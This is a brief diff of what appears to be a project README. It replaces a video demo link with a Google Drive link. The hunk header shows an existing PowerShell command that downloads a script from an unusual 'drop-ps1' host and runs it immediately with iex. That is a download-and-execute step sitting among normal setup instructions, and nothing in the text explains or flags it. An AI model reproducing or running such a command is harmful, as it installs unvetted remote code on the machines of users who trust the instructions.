@@ -60,4 +60,4 @@ iex ((New-Object System.Net.WebClient).DownloadString('https://drop-ps1.fullyjus
 uv run ai_researcher.py
 ```
 Watch the video demo:-
-(https://github.com/TrailCodes/TejasAI/Hacify_TechNova.mp4)
+(https://drive.google.com/file/d/1-SG3kJ53rh84-3ssnJ5TakcM2e1uYVUj/view?usp=sharing)
